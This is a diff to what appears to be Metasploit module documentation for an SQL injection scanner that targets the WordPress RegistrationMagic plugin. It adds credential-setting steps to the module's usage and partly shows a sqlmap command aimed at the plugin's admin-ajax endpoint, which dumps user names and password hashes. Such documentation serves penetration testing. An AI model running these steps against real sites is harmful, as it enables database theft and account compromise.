@@ -19,8 +19,10 @@ sqlmap -u 'http://<IP>/wp-admin/admin-ajax.php?page=rm_ex_chronos_edit_task&rm_f
 2. Start msfconsole
 3. Do: `use auxiliary/scanner/http/wp_registrationmagic_sqli`
 4. Do: `set rhosts [ip]`
-5. Do: `run`
-6. You should get the users and hashes returned.
+5. Do: `set username [username]`
+6. Do: `set password [password]`
+7. Do: `run`
+8. You should get the users and hashes returned.
 
 ## Options
 
